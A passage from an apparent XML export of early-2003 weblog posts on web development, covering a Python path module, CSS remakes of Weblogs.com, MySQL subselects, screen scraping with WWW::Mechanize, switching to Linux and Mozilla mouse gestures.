		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">735</field>
		<field name="title">Python path module</field>
		<field name="slug">pythonPathModule</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.jorendorff.com/articles/python/path/&quot;&gt;path Python module&lt;/a&gt; (via &lt;a href=&quot;http://www.pythonware.com/daily/&quot; title=&quot;no permalinks!&quot;&gt;The Daily Python-URL&lt;/a&gt;) is a nice looking wrapper class for Python's oft-confusing &lt;code&gt;os.path&lt;/code&gt; module. Check out this neat code comparison:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.jorendorff.com/articles/python/path/&quot;&gt;&lt;pre&gt;
# with os.path.walk
def delete_backups(arg, dirname, names):
    for name in names:
        if name.endswith('~'):
            os.remove(os.path.join(dirname, name))

os.path.walk(os.environ['HOME'], delete_backups, None)

# with os.path, if (like me) you can never remember how os.path.walk works
def walk_tree_delete_backups(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isdir(path):
            walk_tree_delete_backups(path)
        elif name.endswith('~'):
            os.remove(path)

walk_tree_delete_backups(os.environ['HOME'])

# with path
dir = path(os.environ['HOME'])
for f in dir.walk():
    if f.isfile() and f.endswith('~'):
        os.remove(f)
&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd go for the third one any day.&lt;/p&gt;</field>
		<field name="created">2003-01-22 18:52:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">736</field>
		<field name="title">Another standards rant</field>
		<field name="slug">anotherStandardsRant</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://members.optusnet.com.au/~night.owl/morons.html&quot;&gt;A message to clueless website authors&lt;/a&gt; is an entertaining and informative rant against browser specific, standards incompliant sites. &lt;a href=&quot;http://www.aquarionics.com/journal/id/976&quot; title=&quot;Muppets in web-space&quot;&gt;Via Aquarionics&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-27 11:30:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">737</field>
		<field name="title">Adequacy gone</field>
		<field name="slug">adequacyGone</field>
		<field name="body">&lt;p&gt;It looks like &lt;a href=&quot;http://adequacy.org/&quot;&gt;Adequacy.org&lt;/a&gt; has come to an end. For those unfamiliar with the site, it was a truly unique evolution of the common &lt;a href=&quot;http://www.wikipedia.org/wiki/Internet_troll&quot;&gt;internet troll&lt;/a&gt;. Adequacy specialised in posting stories that were deliberately designed to cause controversy, then sending out carefully crafted &quot;invitations&quot; to any online communities that were most likely to take the bait. Since, unlike other trolling situations, the trolls were now in control of the discussion they could prolong the scam by deleting any comments which had figured out what was going on and were trying to warn other clueless participants.&lt;/p&gt;

&lt;p&gt;The best explanation of the site is probably &lt;a href=&quot;http://www.kyz.uklinux.net/adequacy.php3&quot; title=&quot;All about adequacy.org&quot;&gt;this one&lt;/a&gt;, by Stuart Caie. An archive of adequacy stories is still available on the site - I recommend the classic &lt;a href=&quot;http://www.adequacy.org/stories/2001.12.2.42056.2147.html&quot;&gt;Is Your Son a Computer Hacker?&lt;/a&gt; (sadly archived without comments) for an example of how the site used to work.&lt;/p&gt;</field>
		<field name="created">2003-01-27 11:30:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">738</field>
		<field name="title">MySQL adds subselects</field>
		<field name="slug">mysqlAddsSubselects</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.mysql.com/press/release_2003_05.html&quot;&gt;MySQL Adds Subselects, Upgrades Performance and Security&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.mysql.com/press/release_2003_05.html&quot;&gt;&lt;p&gt;
MySQL Version 4.1 includes support for SQL subselects, also called subqueries or nested queries, a powerful feature that lets users search complex data with ease and efficiency. With subselects, users can achieve query consolidation by nesting one query inside another query, creating a resource otherwise unavailable for searching in a single statement. Subselects allow users to query within a result set, creatively limit the result set or correlate results with an otherwise unrelated query in a single call to the database.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-01-27 11:32:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">739</field>
		<field name="title">Letter to the editor spam</field>
		<field name="slug">letterToTheEditorSpam</field>
		<field name="body">&lt;p&gt;Scott is &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/01/27.html#a1264&quot; title=&quot;Spam -- in Real Life&quot;&gt;horrified&lt;/a&gt; by the fact that some American political organisations are co-ordinating massive &quot;letter to the editor&quot; campaigns using email lists and websites. It's certainly a worrying trend, but once again &lt;a href=&quot;http://www.whump.com/moreLikeThis/link/03269&quot; title=&quot;Astroturfing Googlehack&quot;&gt;Google comes to the rescue&lt;/a&gt;. Try &lt;a href=&quot;http://www.google.com/search?q=%22demonstrating+genuine+leadership%22&quot; title=&quot;Google Search: &amp;quot;demonstrating genuine leadership&amp;quot;&quot;&gt;this query&lt;/a&gt; and see for yourself.&lt;/p&gt;</field>
		<field name="created">2003-01-27 18:03:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">740</field>
		<field name="title">Work safe CSS</field>
		<field name="slug">workSafeCSS</field>
		<field name="body">&lt;p&gt;Here's a novel use of a &lt;a href=&quot;http://www.alistapart.com/stories/alternate/&quot; title=&quot;A List Apart: Making Alternate Style Sheets Work&quot;&gt;stylesheet switcher&lt;/a&gt;: &lt;a href=&quot;http://www.inluminent.com/weblog/archives/new_inluminentweblog_default_view_no_images.php#000477&quot; title=&quot;New inluminent/weblog default view -- No Images&quot;&gt;Providing a &quot;work safe&quot; edition&lt;/a&gt; of a weblog.&lt;/p&gt;</field>
		<field name="created">2003-01-27 18:09:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">741</field>
		<field name="title">Dynamic Python class methods</field>
		<field name="slug">dynamicPythonClassMethods</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2003/01/27/dynamically_extending_apis.html&quot;&gt;Dynamically extending APIs&lt;/a&gt;: Mark Pilgrim demonstrates how Python's &lt;a href=&quot;http://www.python.org/doc/current/lib/module-new.html&quot;&gt;&quot;new&quot; module&lt;/a&gt; can be used to dynamically add new methods to existing classes at run time, and shows how this can be used to increase productivity when parsing &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. I've long been impressed with Python's ability to add new methods to an object at runtime just by assigning a function reference to an object property but I had no idea it was possible to do this with classes as well. If you liked that tip, &lt;a href=&quot;http://diveintopython.org/&quot;&gt;Dive Into Python&lt;/a&gt; has in depth explanations of more obscure Python features than you can shake a stick at.&lt;/p&gt;</field>
		<field name="created">2003-01-27 19:41:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">742</field>
		<field name="title">Weblogs table as an ordered list</field>
		<field name="slug">weblogsTableAsAnOrderedList</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://scriptingnews.userland.com/backissues/2003/01/27#When:1:14:17PM&quot;&gt;Dave Winer&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/backissues/2003/01/27#When:1:14:17PM&quot;&gt;&lt;p&gt;
A question for CSS design gurus. What's the best you can do with a table that has three columns like the one on &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;Weblogs.Com&lt;/a&gt;. Let's see an example. I'd like the page to look good and load fast. Postscript: No one seems to understand -- I want to do weblogs.com without a table. Column 1 is the number, column 2 is the name of the weblog. Column 3 is the time it last updated. Look at the page.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;At first glance this seems an odd request - from a semantic point of view, the data on Weblogs.com is tabular in nature and would seem like a fine place for a table. I imagine Dave's request relates to performance - I don't know if modern browsers still refuse to render tables until they have loaded all of the content but if that is the case then the Weblogs page could be pretty slow on a narrow-band connection. In any case, the data on the page could also be interpreted as an ordered list. I can never resist a challenge so I &lt;a href=&quot;http://simon.incutio.com/css/demos/weblogs-list.html&quot; title=&quot;Weblogs.com Table as a CSS Styled List&quot;&gt;had a go&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I've tested it on Phoenix 0.5 and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6 on the PC and it worked fine. However, I would be surprised if it worked flawlessly on all modern browsers as it makes heavy use of an absolutely positioned element inside a relatively positioned element. As a result, the data is probably best left as a (perfectly semantically valid) table.&lt;/p&gt;</field>
		<field name="created">2003-01-28 02:34:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">743</field>
		<field name="title">Weblogs markover</field>
		<field name="slug">weblogsMarkover</field>
		<field name="body">&lt;p&gt;Also, I know it isn't what Dave was after but I've &lt;a href=&quot;/css/markovers/WeblogsCom/&quot; title=&quot;Weblogs.com in CSS&quot;&gt;recreated the front page of Weblogs.com&lt;/a&gt; in structural/semantic &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; as well. Again, it works fine in Phoenix and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6 but probably needs a few tweaks for other modern browsers (and Netscape 4 gets a plain layout without any styles at all). I've actually got quite a large collection of &quot;markovers&quot; now - I started doing them last year while learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and they have been accumulating ever since. One of these days I plan to put them online together with a basic overview of the techniques used and problems encountered with each one.&lt;/p&gt;</field>
		<field name="created">2003-01-28 03:33:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">744</field>
		<field name="title">K5 text ads</field>
		<field name="slug">k5TextAds</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.inluminent.com/weblog/archives/its_a_conversation_k5_text_ads.php#000479&quot; title=&quot;It&amp;apos;s a conversation - K5 Text Ads&quot;&gt;Inluminent&lt;/a&gt;, a &lt;a href=&quot;http://www.hypergene.net/blog/weblog.php?id=P86&quot; title=&quot;Kuro5hin&amp;apos;s active text ad comments&quot;&gt;short Q&amp;amp;A&lt;/a&gt;with Rusty of &lt;a href=&quot;http://www.kuro5hin.org/&quot; title=&quot;Kuro5hin&quot;&gt;K5&lt;/a&gt; discussing the site's innovative new text-ads-with-comments format.&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.hypergene.net/blog/weblog.php?id=P86&quot;&gt;
&lt;p&gt;&quot;It definitely is better understood by some advertisers than others. The idea behind ad comments is two-fold. First, for the advertiser, the benefit is that potential customers can meet you on &quot;neutral ground,&quot; ask questions and get more information in a place they're already comfortable. It gives advertisers a space they can use to tailor their message to individuals, rather than keeping them at the kind of impersonal distance that a banner ad can create.&lt;/p&gt;

&lt;p&gt;&quot;And for the users, the benefit is that they can see what others have said abut the product, whether that's good or bad, and how the advertiser has dealt with other people. A key feature of this is that ad discussions operate according to K5's normal discussion rules -- comments can be rated by everyone, and aren't subject to the desires of the advertiser.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Quite frankly, I think this is a truly inspired twist to internet advertising. A text ad on its own (as seen on Google, for example) is a couple of lines of text trying to convey a whole bunch of information. They are trivial to ignore - in fact I suspect I am already developing a form of &quot;banner blindness&quot; towards them. K5 ads are different - it's a text add, but what's this &quot;131 comments&quot; link? Suddenly the tiny advert has become the gateway to an informative two way discussion about the product. Smart companies can get stuck in with potential customers, answering questions and generally demonstrating that they know what they are talking about and are worth doing business with.&lt;/p&gt;

&lt;p&gt;It's probably too radical to take off as a mainstream advertising technique (most companies would run a mile at the idea of unmoderated comments appended to their adverts) but I can see it working really well on many community style sites.&lt;/p&gt;</field>
		<field name="created">2003-01-28 03:57:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">745</field>
		<field name="title">Weblogs.com table using floats</field>
		<field name="slug">weblogsTableUsingFloats</field>
		<field name="body">&lt;p&gt;I've knocked up &lt;a href=&quot;http://simon.incutio.com/css/demos/weblogs-list-floats.html&quot; title=&quot;Weblogs table in CSS using floats&quot;&gt;another attempt&lt;/a&gt; at Weblogs.com in CSS, this time using floats instead of absolute/relative positioning. It seems to work pretty well.&lt;/p&gt;</field>
		<field name="created">2003-01-28 13:36:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">746</field>
		<field name="title">More markovers</field>
		<field name="slug">moreMarkovers</field>
		<field name="body">&lt;p&gt;Other weblogs.com remakes: (via &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2003/01/28&quot;&gt;Scripting News&lt;/a&gt;): &lt;a href=&quot;http://www.geocities.com/sgeratt/weblogs.html&quot;&gt;Gary Taylor&lt;/a&gt;, &lt;a href=&quot;http://davespicks.com/archive/2003/0128.html#1043755703&quot;&gt;Dave Polaschek&lt;/a&gt;, &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20030128&quot;&gt;Douglas Bowman&lt;/a&gt;. Doug's is particularly impressive, featuring an almost pixel perfect recreation of the original page with nice semantic markup and nods towards accessibility as well.&lt;/p&gt;</field>
		<field name="created">2003-01-28 16:35:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">747</field>
		<field name="title">Mmm... pie</field>
		<field name="slug">mmmPie</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.weebl.jolt.co.uk/pie.htm&quot;&gt;Weebl and Bob like pie&lt;/a&gt;. I also like pie. Luckily for me, my girlfriend, while frequently a disaster in the kitchen (rice and OXO gravy anyone?), is a truly accomplished pie chef as of last night. She has posted her delectable recipe &lt;a href=&quot;http://www.natbat.co.uk/chickenPie.php&quot; title=&quot;The perfect chicken pie&quot;&gt;here&lt;/a&gt;. Her &lt;a href=&quot;http://www.natbat.co.uk/cookies.php&quot;&gt;chocolate chip cookies&lt;/a&gt; are even better.&lt;/p&gt;</field>
		<field name="created">2003-01-29 01:57:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">748</field>
		<field name="title">Switched</field>
		<field name="slug">switched</field>
		<field name="body">&lt;p&gt;I never thought I'd actually do it, but I've switched. Not to &lt;a href=&quot;http://www.apple.com/powerbook/index17.html&quot; title=&quot;oooooooooh&quot;&gt;one of these&lt;/a&gt; (I only wish I could afford it), but to &lt;a href=&quot;http://www.mandrakelinux.com/&quot;&gt;Mandrake 9&lt;/a&gt;. The way I figured it I only ever use Windows 98 for browsing the web, editing text files and messing around with &lt;a href=&quot;http://www.python.org/&quot;&gt;Python&lt;/a&gt;, so I might as well get stuck in to a more exciting operating system with the same capabilities.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.mozilla.org/projects/phoenix/&quot;&gt;Phoenix&lt;/a&gt; on Linux is exactly the same as Phoenix on Windows, and remains an absolute pleasure. My mail is now handled by &lt;a href=&quot;http://www.ximian.com/products/evolution/&quot;&gt;Evolution&lt;/a&gt;, which has been crunching through my six week backlog (don't ask) on both of my mail accounts with consumate ease, thanks to the excellent filtering. I've also been introduced to &lt;a href=&quot;http://dillo.auriga.wearlab.de/&quot;&gt;Dillo&lt;/a&gt;, a truly tiny graphical web browser (less than 200&lt;acronym title=&quot;KiloBytes&quot;&gt;KB&lt;/acronym&gt; compiled) which never the less does a great job of rendering table based sites at almost ridiculous speeds. &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is completely ignored, but &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; sites tend to be perfectly usable without formatting anyway.&lt;/p&gt;

&lt;p&gt;The only thing I'm really missing is a good text editor - I'm spoiled for choice, but nothing I've played with so far has been half as productive as &lt;a href=&quot;http://www.ultraedit.com/&quot;&gt;UltraEdit&lt;/a&gt;. I think I need to pick a Unix editor and stick with it until I've learnt it inside out, but deciding which one to dedicate myself to is proving difficult.&lt;/p&gt;</field>
		<field name="created">2003-01-29 02:15:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">749</field>
		<field name="title">Python bits and bobs</field>
		<field name="slug">pythonBitsAndBobs</field>
		<field name="body">&lt;p&gt;Two fun bits from the &lt;a href=&quot;http://www.pythonware.com/daily/&quot;&gt;Daily Python URL&lt;/a&gt; today (still without permalinks). &lt;a href=&quot;http://colorstudy.com/software/SQLObject/&quot;&gt;SQLObject&lt;/a&gt; is an object-relational mapper class which can create objects that directly map to rows in a relational database, making INSERTs and UPDATEs much simpler. I've tried to write this kind of thing in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; before with mixed results, so I'm quite tempted to pinch the idea of tracking foreign keys and joins for my next attempt. More immediately useful however is &lt;a href=&quot;http://codespeak.net/~hpk/rlcompleter2/&quot;&gt;rlcompleter2&lt;/a&gt; which adds tab based auto completion to the Python interactive prompt. I had a play with it earlier and it was definitely an improvement on the vanilla command line.&lt;/p&gt;</field>
		<field name="created">2003-01-29 23:24:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">750</field>
		<field name="title">Off to amsterdam</field>
		<field name="slug">oggToAmsterdam</field>
		<field name="body">&lt;p&gt;Off to Amsterdam. Back Sunday.&lt;/p&gt;</field>
		<field name="created">2003-01-30 17:00:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">751</field>
		<field name="title">Mechanize the web</field>
		<field name="slug">mechanizeTheWeb</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.keithdevens.com/weblog/?id3345&quot; title=&quot;Keith Devens: Friday, January 24, 2003&quot;&gt;Keith Devens&lt;/a&gt;, &lt;a href=&quot;http://www.perl.com/pub/a/2003/01/22/mechanize.html&quot;&gt;Screen-scraping with WWW::Mechanize&lt;/a&gt; describes how Perl's &lt;code&gt;WWW::Mechanize&lt;/code&gt; module can be used to grab information from sites that require a user login. I've always dismissed screen scraping as something of a wasted effort, given the fact that a major rewrite of the scraper is required whenever the target site tweaks its &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. This article has encouraged me to reconsider - some of the functionality in &lt;code&gt;WWW::Mechanise&lt;/code&gt; is fantastic:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.perl.com/pub/a/2003/01/22/mechanize.html&quot;&gt;&lt;p&gt;
We create a WWW::Mechanize object and tell it the address of the site
we'll be working from.  The Radio Times' front page has an image link
with an ALT text of &quot;My Diary&quot;, so we can use that to get to the right
section of the site:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
  my $agent = WWW::Mechanize-&amp;gt;new();
  $agent-&amp;gt;get(&quot;http://www.radiotimes.beeb.com/&quot;);
  $agent-&amp;gt;follow(&quot;My Diary&quot;);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The returned page contains two forms - one to allow you to choose from a
list box of program types, and then a login form for the diary
function.  We tell WWW::Mechanize to use the second form for input.
(Something to remember here is that WWW::Mechanize's list of forms,
unlike an array in Perl, is indexed starting at 1 rather than 0.  Our
index is, therefore,'2.')&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
  $agent-&amp;gt;form(2);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can fill in our e-mail address for the '&amp;lt;INPUT name=&quot;email&quot;
type=&quot;text&quot;&amp;gt;' field, and click the submit button.  Nothing too
complicated.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
  $agent-&amp;gt;field(&quot;email&quot;, $email);
  $agent-&amp;gt;click();&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;I'm still not quite impressed enough to learn Perl, but I'm very tempted to borrow some of the ideas and re-implement them in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; or Python.&lt;/p&gt;</field>
		<field name="created">2003-02-03 18:34:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">752</field>
		<field name="title">Vellum on Windows</field>
		<field name="slug">vellumOnWindows</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.dellah.com/orient/2003/02/04/vellum_on_windows.shtml&quot; title=&quot;Vellum on Windows&quot;&gt;Paul Freeman&lt;/a&gt;, &lt;a href=&quot;http://www.reflectivesurface.com/weblog/archives/2003/02/02/vellum_on_windows&quot; title=&quot;Installing Vellum on Windows&quot;&gt;detailed instructions&lt;/a&gt; for installing Stuart's &lt;a href=&quot;http://www.kryogenix.org/code/vellum/&quot;&gt;Vellum&lt;/a&gt; Python blogging system on Windows using either &lt;acronym title=&quot;Internet Information Server&quot;&gt;IIS&lt;/acronym&gt; or Apache.&lt;/p&gt;</field>
		<field name="created">2003-02-04 18:34:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">753</field>
		<field name="title">More on screen scraping</field>
		<field name="slug">moreOnScreenScraping</field>
		<field name="body">&lt;p&gt;In response to yesterday's &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/03/#mechanizeTheWeb&quot;&gt;screen scraping post&lt;/a&gt;, Richard Jones &lt;a href=&quot;http://mechanicalcat.net/cgi-bin/log/2003/02/03#python_www_mechanise&quot; title=&quot;Python versions of WWW:Mechanize&quot;&gt;describes&lt;/a&gt; a screen scraping technique that uses PyWebPwerf, a Python performance measuring tool.&lt;/p&gt;

&lt;p&gt;I forgot to mention it in the article, but &lt;a href=&quot;http://snoopy.sourceforge.net/&quot;&gt;Snoopy&lt;/a&gt; is a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; web client library which can retrieve content and emulate a browser interacting with forms. I've used it for simple screen scraping before, but it still lacks some of the more impressive functionality that WWW::Mechanize demonstrates.&lt;/p&gt;</field>
		<field name="created">2003-02-04 18:47:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">754</field>
		<field name="title">Zeldman and definition lists</field>
		<field name="slug">zeldmanAndDefinitionLists</field>
		<field name="body">&lt;p&gt;I'm really liking Jeffrey Zeldman's &lt;a href=&quot;http://www.zeldman.com/&quot; title=&quot;Zeldman.com&quot;&gt;latest redesign&lt;/a&gt;. Aside from a pretty face, the markup holds some interesting ideas as well. For example, I've never seen a definition list used for a blogroll style list before:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
&amp;lt;dl id=&quot;outside2&quot; style=&quot;display:none;&quot;&amp;gt;
&amp;lt;dt&amp;gt;Relevant Externals:&amp;lt;/dt&amp;gt;
&amp;lt;dd&amp;gt;&amp;lt;a href=&quot;http://www.20things.org/&quot; target=&quot;eljefe&quot; 
  title=&quot;20 people make 20 things in 20 days.&quot;&amp;gt;20 things&amp;lt;/a&amp;gt;&amp;lt;/dd&amp;gt;
&amp;lt;dd&amp;gt;&amp;lt;a href=&quot;http://www.alistapart.com/stories/indexAccessibility.html&quot; target=&quot;eljefe&quot; 
  title=&quot;Accessibility articles and tutorials at A List Apart.&quot;&amp;gt;Access @ ALA&amp;lt;/a&amp;gt;&amp;lt;/dd&amp;gt;
&amp;lt;dd&amp;gt;&amp;lt;a href=&quot;http://www.gregstorey.com/airbag/&quot; target=&quot;eljefe&quot; 
  title=&quot;Greg Storey&amp;amp;#8217;s beautiful personal periodical.&quot;&amp;gt;Airbag&amp;lt;/a&amp;gt;&amp;lt;/dd&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It makes sense in that &quot;Relevant Externals&quot; is a definition of the following list of defined terms. The &lt;a href=&quot;http://www.w3.org/TR/html401/struct/lists.html#h-10.3&quot; title=&quot;Definition lists: the DL, DT, and DD elements&quot;&gt;official specification&lt;/a&gt; for definition lists is notoriously vague in any case:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.w3.org/TR/html401/struct/lists.html#h-10.3&quot;&gt;
&lt;p&gt;Definition lists vary only slightly from other types of lists in that list items consist of two parts: a term and a description. The term is given by the DT element and is restricted to inline content. The description is given with a DD element that contains block-level content.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;Another application of DL, for example, is for marking up dialogues, with each DT naming a speaker, and each DD containing his or her words.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-02-05 23:38:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">755</field>
		<field name="title">The slashdot effect</field>
		<field name="slug">slashdotEffect</field>
		<field name="body">&lt;p&gt;Dave Winer &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2003/02/04#When:2:49:44PM&quot; title=&quot;Scripting News: Tuesday, February 04, 2003&quot;&gt;asks&lt;/a&gt; why Joel Spolsky gets much more traffic when slashdotted than UserLand's hosted sites tend to. Joel &lt;a href=&quot;http://www.joelonsoftware.com/news/20030205.html&quot; title=&quot;Joel on Software: Wednesday, February 5, 2003&quot;&gt;explains&lt;/a&gt; (it's all down to network effects) and mpt &lt;a href=&quot;http://mpt.phrasewise.com/2003/02/05#a456&quot; title=&quot;Variations in the Slashdot Effect&quot;&gt;kicks in a few ideas&lt;/a&gt; as well. &lt;/p&gt;</field>
		<field name="created">2003-02-05 23:43:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">756</field>
		<field name="title">More YAML</field>
		<field name="slug">moreYaml</field>
		<field name="body">&lt;p&gt;Paul Tchistopolskii's &lt;a href=&quot;http://www.pault.com/pault/pxml/xmlalternatives.html&quot;&gt;XML Alternatives&lt;/a&gt; reminded me to take another look at &lt;a href=&quot;YAML Ain&amp;apos;t Markup Language&quot;&gt;YAML&lt;/a&gt;. The specification has been updated since &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/05/#yaml&quot;&gt;I last looked&lt;/a&gt; and seems to be a bit more complicated, but it's still a very nicely designed format. Implementations are available for Perl, Python and Ruby with C and Java on the way but strangely no one seems to be doing one for &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; yet. I'm doing a course at Uni on compilers at the moment which includes quite a lot of stuff about writing parsers so I'm very tempted to have a go at a YAML implementation in the next few weeks just to try stuff out. The possibility of easily swapping relatively complex data structures between &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and Python is pretty tempting as well.&lt;/p&gt;</field>
		<field name="created">2003-02-05 23:49:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">757</field>
		<field name="title">Enhanced textareas</field>
		<field name="slug">enhancedTextArea</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://randomfoo.net/?p=2003_02_02_archive.inc#90282195&quot; title=&quot;random($foo): Wednesday, February 05, 2003&quot;&gt;Leonard Lin&lt;/a&gt;, a &lt;a href=&quot;http://www.ecademy.com/test/textarea/&quot; title=&quot;IE, Mozilla and Phoenix compatible html editing&quot;&gt;nice demonstration&lt;/a&gt; of an enhanced HTML text area (with buttons to add tags) that works in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, Mozilla and Phoenix. Until recently this had not been possible thanks to a long standing Mozilla bug.&lt;/p&gt;</field>
		<field name="created">2003-02-05 23:53:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">758</field>
		<field name="title">Better mouse gestures</field>
		<field name="slug">betterMouseGestures</field>
		<field name="body">&lt;p&gt;Optimoz have released &lt;a href=&quot;http://optimoz.mozdev.org/gestures/installation.html&quot; title=&quot;gestures/installation&quot;&gt;Version 0.3.5 Release Candidate 3&lt;/a&gt; of their mouse gestures add-on for Mozilla based browsers. I hadn't tried the version 0.3.5 series before and the improvements are impressive to say the least:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;The add-on works in &lt;a href=&quot;http://www.mozilla.org/projects/phoenix/&quot;&gt;Phoenix&lt;/a&gt;!&lt;/li&gt;
 &lt;li&gt;&quot;Rocker&quot; gestures are now included as standard. Hold the left mouse button and click right once to go forward, hold the right mouse button and click left once to go back.&lt;/li&gt;
 &lt;li&gt;The Phoenix version now has an entry in the preferences panel.&lt;/li&gt;
 &lt;li&gt;&quot;Diagonal tolerance&quot; can be configured (for if you are having trouble getting the diagonal gestures to work).&lt;/li&gt;
 &lt;li&gt;The optional mouse gestures sidebar now knows which gstures you use and promotes the least used ones to the top of the list.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I have severe trouble browsing without gestures these days, but the biggest time saver of them all has to be the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; validation gesture - draw a V on the page and instantly see if it is valid [X]HTML or not.&lt;/p&gt;</field>
		<field name="created">2003-02-06 18:59:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">759</field>
		<field name="title">A better phoenix icon</field>
		<field name="slug">aBetterPhoenixIcon</field>
		<field name="body">&lt;p&gt;And over on &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/change_the_phoenix_icon.html&quot; title=&quot;Change the Phoenix Icon&quot;&gt;Blogzilla&lt;/a&gt;, Lim Chee Aun has finally solved the niggling bug with Phoenix 0.5 on Windows where the icon shown in the taskbar is an ugly default Windows image.&lt;/p&gt;</field>
		<field name="created">2003-02-06 19:20:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">760</field>
		<field name="title">Meetup needs work</field>
		<field name="slug">meetupNeedsWork</field>
